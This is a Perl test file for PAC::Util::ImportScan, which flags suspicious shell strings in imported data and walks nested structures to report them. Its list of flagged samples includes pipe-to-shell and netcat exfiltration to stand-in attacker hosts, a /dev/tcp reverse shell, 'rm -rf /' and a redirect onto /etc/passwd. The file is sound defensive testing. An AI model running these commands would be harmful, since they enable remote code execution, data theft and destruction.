#!/usr/bin/perl
# t/57-import-scan.t — PAC::Util::ImportScan suspicious-pattern detector.

use strict;
use warnings;
use Test::More;
use FindBin qw($RealBin);
use lib "$RealBin/../lib";

require_ok('PAC::Util::ImportScan');
can_ok('PAC::Util::ImportScan', $_) for qw(scan _is_suspicious);

# ── _is_suspicious — single-string predicate ───────────────────────
ok(!PAC::Util::ImportScan::_is_suspicious('hello world'),
    'plain string is safe');
ok(!PAC::Util::ImportScan::_is_suspicious(undef),
    'undef is safe');
ok(!PAC::Util::ImportScan::_is_suspicious(''),
    'empty is safe');
ok(!PAC::Util::ImportScan::_is_suspicious(\1),
    'reference is safe (not a string)');

# Various flagged patterns
my @bad = (
    'echo $(rm -rf /)',                            # command substitution
    'echo `id`',                                   # backtick
    'eval $code',                                  # eval keyword
    'exec $cmd',                                   # exec keyword
    'system($cmd)',                                # system keyword
    'rm -rf /tmp',                                 # forced recursive
    'foo; curl evil.com | sh',                     # ; curl/sh
    'data | nc attacker.com 1337',                 # piped to nc
    'cat /dev/tcp/attacker/4444',                  # bash reverse shell
    'mkfifo /tmp/p',                               # named pipe
    'socat tcp:host:port -',                       # socat
    'python -c "import os; os.system(\'sh\')"',    # python -c
    'perl -e "..."',                               # perl -e
    'echo > /etc/passwd',                          # absolute redirect
    'cat <<EOF >/tmp/script',                      # heredoc
);
ok(PAC::Util::ImportScan::_is_suspicious($_), "flags: $_") for @bad;

# Plain-looking strings should NOT trigger
my @safe = (
    'My SSH server',
    'user@example.com',
    '/usr/local/bin/myscript',
    'connection-name-with-dashes',
    'pass123!@#',
    'echo hi',                  # bare 'echo' is fine
);
ok(!PAC::Util::ImportScan::_is_suspicious($_), "safe: $_") for @safe;

# ── scan — recursive walker ────────────────────────────────────────
my ($n, $first) = PAC::Util::ImportScan::scan({
    name => 'OK',
    payload => 'echo hi',
});
is($n, 0, 'clean structure: count=0');
is($first, '', 'clean structure: no detail');

($n, $first) = PAC::Util::ImportScan::scan({
    benign => 'plain text',
    bad    => 'eval $code',
});
is($n, 1, 'one bad string in flat hash');
like($first, qr/at root\/bad/, 'detail mentions path to bad string');
like($first, qr/eval/, 'detail includes the bad value');

($n, $first) = PAC::Util::ImportScan::scan({
    deep => {
        nested => {
            list => ['ok', 'rm -rf /', { evil => 'mkfifo /tmp/p' }],
        },
    },
});
ok($n >= 2, "deep walk found multiple ($n)");

# Empty / undef inputs
($n, $first) = PAC::Util::ImportScan::scan(undef);
is($n, 0, 'undef -> count=0');
($n, $first) = PAC::Util::ImportScan::scan({});
is($n, 0, 'empty hash -> count=0');
($n, $first) = PAC::Util::ImportScan::scan([]);
is($n, 0, 'empty array -> count=0');

# PACMain wires the new module
my $main = do {
    open my $f, '<', "$RealBin/../lib/PACMain.pm" or die "open: $!";
    local $/; <$f>;
};
like($main, qr/require PAC::Util::ImportScan/,
    'PACMain requires PAC::Util::ImportScan');
like($main, qr/PAC::Util::ImportScan::scan/,
    'PACMain calls scan()');
unlike($main, qr/^\s*\$scan_value\s*=\s*sub\s*\{/m,
    'old inline scan_value closure removed');

# POD
my $src = do {
    open my $f, '<', "$RealBin/../lib/PAC/Util/ImportScan.pm" or die "open: $!";
    local $/; <$f>;
};
like($src, qr/^=head1 NAME/m,       'POD: NAME');
like($src, qr/^=head1 PUBLIC API/m, 'POD: PUBLIC API');
like($src, qr/^=item scan\b/m,      'POD =item scan');

done_testing();
